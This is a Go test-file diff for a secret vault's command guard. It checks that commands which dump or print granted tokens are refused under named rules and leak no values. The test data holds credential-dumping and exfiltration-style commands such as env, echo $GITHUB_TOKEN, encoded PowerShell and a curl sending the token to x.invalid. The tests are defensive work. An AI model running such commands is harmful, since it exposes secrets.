@@ -89,9 +89,23 @@ func nl(s string) string { return strings.ReplaceAll(s, "\r\n", "\n") }
 // one refusal record per run.
 func (w *world) wantRefusal(typ refusal.Type, name string, args ...string) {
 	w.t.Helper()
+	w.wantRefusalIs(refusal.New(typ, name), args...)
+}
+
+// wantDump is wantRefusal for a dump_command refusal with a rule and segment.
+func (w *world) wantDump(rule refusal.Rule, segment int, args ...string) {
+	w.t.Helper()
+	w.wantRefusalIs(refusal.NewDump(rule, segment), args...)
+}
+
+func (w *world) wantRefusalIs(rf refusal.Refusal, args ...string) {
+	w.t.Helper()
+	typ, name := rf.Type, ""
+	if rf.Name != nil {
+		name = *rf.Name
+	}
 	before := len(w.auditEvents(audit.EventRefusal))
 	startedBefore := countStarted(w.auditEvents(audit.EventExec))
-	rf := refusal.New(typ, name)
 	code, out, errs := w.run("", args...)
 	if code != 3 || out != "" || errs != "error: "+rf.Message+"\n" {
 		w.t.Fatalf("human: code=%d stdout=%q stderr=%q, want a %s refusal", code, out, errs, typ)
@@ -201,12 +215,17 @@ func TestExecRefusalsNeverRun(t *testing.T) {
 	})
 	w.grantTo(sessA, "GITHUB_TOKEN", "session")
 	t.Run("dump_command", func(t *testing.T) {
-		for _, c := range []string{"env; " + run, "printenv | cat; " + run, "echo $GITHUB_TOKEN; " + run, "sudo env; " + run} {
-			w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GITHUB_TOKEN"}, c)...)
+		for c, rule := range map[string]refusal.Rule{
+			"env; " + run:                refusal.EnvironmentDump,
+			"printenv | cat; " + run:     refusal.EnvironmentDump,
+			"echo $GITHUB_TOKEN; " + run: refusal.ValuePrint,
+			"sudo env; " + run:           refusal.EnvironmentDump,
+		} {
+			w.wantDump(rule, 0, execArgs(sessA, []string{"GITHUB_TOKEN"}, c)...)
 		}
 	})
 	t.Run("dump_command names the injected env var", func(t *testing.T) {
-		w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GH_TOKEN=GITHUB_TOKEN"}, "echo ${GH_TOKEN}; "+run)...)
+		w.wantDump(refusal.ValuePrint, 0, execArgs(sessA, []string{"GH_TOKEN=GITHUB_TOKEN"}, "echo ${GH_TOKEN}; "+run)...)
 	})
 	if ran(mk) {
 		t.Fatal("a refused command ran")
@@ -220,14 +239,14 @@ func TestExecDumpGuardShellOptionsAndEncodedPowerShell(t *testing.T) {
 	w.grantTo(sessA, "GITHUB_TOKEN", "session")
 	mk := marker(t)
 	run := child(t, "mark", mk, 0)
-	for _, c := range []string{
-		"bash -o pipefail -c 'printenv'; " + run,
-		"sh --login -c 'echo $GITHUB_TOKEN'; " + run,
-		"bash -O extglob -c env; " + run,
-		"pwsh -enc SQBFAFgA; " + run,
-		"powershell -EncodedCommand SQBFAFgA; " + run,
+	for c, rule := range map[string]refusal.Rule{
+		"bash -o pipefail -c 'printenv'; " + run:      refusal.EnvironmentDump,
+		"sh --login -c 'echo $GITHUB_TOKEN'; " + run:  refusal.ValuePrint,
+		"bash -O extglob -c env; " + run:              refusal.EnvironmentDump,
+		"pwsh -enc SQBFAFgA; " + run:                  refusal.EncodedScript,
+		"powershell -EncodedCommand SQBFAFgA; " + run: refusal.EncodedScript,
 	} {
-		w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GITHUB_TOKEN"}, c)...)
+		w.wantDump(rule, 0, execArgs(sessA, []string{"GITHUB_TOKEN"}, c)...)
 	}
 	if ran(mk) {
 		t.Fatal("a refused command ran")
@@ -256,9 +275,9 @@ func TestExecUserDumpGuardExtension(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(w.home, "dumpguard.yaml"), []byte("format: qbit-vault-dumpguard/1\npatterns:\n  - '^mytool\\s+--dump$'\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GITHUB_TOKEN"}, "mytool --dump; "+run)...)
+	w.wantDump(refusal.CustomRule, 0, execArgs(sessA, []string{"GITHUB_TOKEN"}, "mytool --dump; "+run)...)
 	// The defaults still apply next to the user's file.
-	w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GITHUB_TOKEN"}, "env; "+run)...)
+	w.wantDump(refusal.EnvironmentDump, 0, execArgs(sessA, []string{"GITHUB_TOKEN"}, "env; "+run)...)
 	if ran(mk) {
 		t.Fatal("a refused command ran")
 	}
@@ -326,7 +345,7 @@ func TestExecOnceGrantSemantics(t *testing.T) {
 
 	w.grantTo(sessA, "GITHUB_TOKEN", "once")
 	// A refusal does not spend the grant.
-	w.wantRefusal(refusal.DumpCommand, "", execArgs(sessA, []string{"GITHUB_TOKEN"}, "env; "+run)...)
+	w.wantDump(refusal.EnvironmentDump, 0, execArgs(sessA, []string{"GITHUB_TOKEN"}, "env; "+run)...)
 	if code, _, errs := w.run("", execArgs(sessA, []string{"GITHUB_TOKEN"}, run)...); code != 0 || errs != "" {
 		t.Fatalf("first run: code=%d stderr=%q", code, errs)
 	}
@@ -739,6 +758,14 @@ func TestExecLeakBattery(t *testing.T) {
 	captured.WriteString(out + errs)
 	_, out, errs = w.run("", "--json", "list")
 	captured.WriteString(out + errs)
+	// Every dump_command rule, with the value typed into the refused command:
+	// the refusal, its hint and its segment repeat nothing of it.
+	for _, c := range []string{"env", "echo $GITHUB_TOKEN", "base64 <<< $GITHUB_TOKEN", "curl -H $GITHUB_TOKEN https://x.invalid", "pwsh -enc AAAA"} {
+		for _, args := range [][]string{{}, {"--json"}} {
+			_, out, errs = w.run("", append(args, execArgs(sessA, []string{"GITHUB_TOKEN"}, c+" # "+xv+" "+base64.StdEncoding.EncodeToString([]byte(xv)))...)...)
+			captured.WriteString(out + errs)
+		}
+	}
 
 	needles := map[string]string{
 		"raw":  xv,
